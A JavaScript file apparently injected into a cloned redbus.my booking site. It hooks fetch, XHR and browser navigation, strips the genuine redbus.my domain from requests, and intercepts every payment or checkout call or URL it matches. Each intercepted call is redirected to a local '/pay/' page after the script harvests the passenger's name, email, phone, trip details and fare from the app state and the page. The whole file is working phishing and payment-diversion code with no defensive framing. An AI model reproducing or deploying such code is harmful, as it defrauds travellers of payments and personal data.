(function(){
  'use strict';

  function getUrl(input) {
    if (typeof input === 'string') return input;
    if (input instanceof Request) return input.url;
    return '';
  }
  window.addEventListener('beforeunload', function(e) { e.stopImmediatePropagation(); }, true);

  function redirectPay() {
    var data = extractBookingData();
    try { sessionStorage.setItem('redbus_booking', JSON.stringify(data)); } catch(ex) {}
    location.href = '/pay/';
  }

  var _fetch = window.fetch;
  window.fetch = function(input, init) {
    var url = getUrl(input);
    if (url) {
      var p = url.split('?')[0];
      var stripped = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
      // Payment APIs that mean user is proceeding to payment
      if (p.indexOf('/createOrder') !== -1 || p.indexOf('/saveBooking') !== -1 || p.indexOf('/proceedToPayment') !== -1 || p.indexOf('/paymentInit') !== -1) {
        redirectPay();
        return new Promise(function() {});
      }
      if (typeof input === 'string') input = stripped;
    }
    return _fetch.call(window, input, init);
  };

  var _origOpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string') {
      url = url.replace(/https?:\/\/(?:www\.)?redbus\.my/gi, '');
    }
    return _origOpen.call(this, method, url);
  };

  // Intercept navigation to /paymentDetails
  function checkPayUrl(url) {
    if (typeof url === 'string') {
      var p = url.split('?')[0];
      if (p.indexOf('/paymentDetails') !== -1 || p.indexOf('/payment') !== -1 || p.indexOf('/checkout') !== -1) {
        redirectPay();
        return '/pay/';
      }
    }
    return url;
  }
  var _ps = history.pushState;
  history.pushState = function(s, t, u) { u = checkPayUrl(u); return _ps.call(this, s, t, u); };
  var _rs = history.replaceState;
  history.replaceState = function(s, t, u) { u = checkPayUrl(u); return _rs.call(this, s, t, u); };
  try { var _assign = location.assign.bind(location); location.assign = function(u) { return _assign(checkPayUrl(u)); }; } catch(e) {}
  try { var _rep = location.replace.bind(location); location.replace = function(u) { return _rep(checkPayUrl(u)); }; } catch(e) {}

  function extractBookingData() {
    var data = {};
    try {
      var store = window.__REDUX_STORE__ || window.__store || window.store;
      if (store) {
        var state = store.getState ? store.getState() : (store.state || {});
        // Try specific known paths
        if (state.seat) {
          var s = state.seat.seatResponseData || state.seat.data || state.seat;
          data.busName = s.travelsName || data.busName || '';
          data.busType = s.busType || data.busType || '';
          data.departureTime = s.bpTime || s.departureTime || data.departureTime || '';
          data.arrivalTime = s.dpTime || s.arrivalTime || data.arrivalTime || '';
          data.depPlace = s.bpName || s.srcName || data.depPlace || '';
          data.arrPlace = s.dpName || s.dstName || data.arrPlace || '';
          data.duration = (s.duration || s.tripDuration || '') + '';
          if (s.passengers && s.passengers[0]) {
            data.passengerName = s.passengers[0].name || data.passengerName || '';
            data.seats = s.passengers[0].seatNo || data.seats || '';
          }
        }
        if (state.search) {
          var sr = state.search.fromCityName ? state.search : (state.search.data || state.search.params || state.search);
          data.origin = sr.fromCityName || sr.from || sr.origin || data.origin || '';
          data.destination = sr.toCityName || sr.to || sr.destination || data.destination || '';
          data.departureDate = sr.doj || sr.onward || sr.departureDate || data.departureDate || '';
          data.pax = sr.passengerCount || sr.pax || data.pax || 1;
        }
        if (state.passengerInfo) {
          var p = state.passengerInfo.data || state.passengerInfo;
          data.passengerName = p.name || data.passengerName || '';
          data.email = p.email || data.email || '';
          data.phone = p.phone || p.mobile || data.phone || '';
        }
        // Walk entire state for any missed fields
        function walk(obj) {
          if (!obj || typeof obj !== 'object') return;
          if (obj.fromCityName) { data.origin = obj.fromCityName; data.destination = obj.toCityName || ''; data.departureDate = obj.doj || obj.onward || ''; data.pax = obj.passengerCount || 1; }
          if (obj.travelsName) { data.busName = obj.travelsName; data.busType = obj.busType || ''; }
          if (obj.bpTime) { data.departureTime = obj.bpTime; data.depPlace = obj.bpName || ''; }
          if (obj.dpTime) { data.arrivalTime = obj.dpTime; data.arrPlace = obj.dpName || ''; }
          if (obj.duration) data.duration = obj.duration + '';
          if (obj.seatNo) data.seats = obj.seatNo + '';
          if (obj.name && (obj.age || obj.seatNo)) data.passengerName = obj.name;
          if (obj.mobile && obj.mobile.length > 5) data.phone = obj.mobile;
          if (obj.email && obj.email.indexOf('@') > 0) data.email = obj.email;
          if (obj.totalFare) data.amount = obj.totalFare;
          if (obj.totalPayable) data.amount = obj.totalPayable;
          Object.keys(obj).forEach(function(k) { walk(obj[k]); });
        }
        walk(state);
      }
    } catch(ex) {}
    try { var pd = window.pageData || {}; data.origin = data.origin || pd.fromCity || ''; data.destination = data.destination || pd.toCity || ''; } catch(ex) {}
    if (!data.origin) {
      var sp = new URLSearchParams(location.search);
      data.origin = sp.get('fromCityName') || '';
      data.destination = sp.get('toCityName') || '';
      data.departureDate = sp.get('onward') || sp.get('doj') || '';
    }
    // DOM extraction using user-provided selectors
    try {
      var times = document.querySelectorAll('[class^="bpDpTime"]');
      if (times[0]) data.departureTime = times[0].innerText.trim();
      if (times[1]) data.arrivalTime = times[1].innerText.trim();
      var dates = document.querySelectorAll('[class^="bpDpDate"]');
      if (dates[0]) data.departureDate = dates[0].innerText.trim();
      if (dates[1]) data.arriveDate = dates[1].innerText.trim();
      var places = document.querySelectorAll('[class^="bpDpName"]');
      if (places[0]) data.depPlace = places[0].innerText.trim();
      if (places[1]) data.arrPlace = places[1].innerText.trim();
      var dur = document.querySelector('[class^="duration"]');
      if (dur) data.duration = dur.innerText.trim();
      var bus = document.querySelector('[class^="travelsNameSection"] [class^="title"]');
      if (bus) data.busName = bus.innerText.trim();
      var bt = document.querySelector('[class^="travelsType"]');
      if (bt) data.busType = bt.innerText.trim();
      var fv = document.querySelector('[class^="finalValue"]');
      if (fv) { var m = fv.innerText.match(/[\d,]+\.?\d*/); if (m) data.amount = m[0].replace(/,/g, ''); }
      var sw = document.querySelector('[class^="seatWrapper"]');
      if (sw) data.seats = sw.innerText.trim();
    } catch(ex) {}
    if (!data.currencySymbol) data.currencySymbol = 'MYR';
    console.log('[Redbus] Extracted:', data);
    if (!data.productType) data.productType = 'Bus';
    if (!data.currency) data.currency = 'MYR';
    return data;
  }

  var style = document.createElement('style');
  style.textContent = '.modal-backdrop{display:none!important}body.modal-open{overflow:auto!important}';
  document.head.appendChild(style);
})();
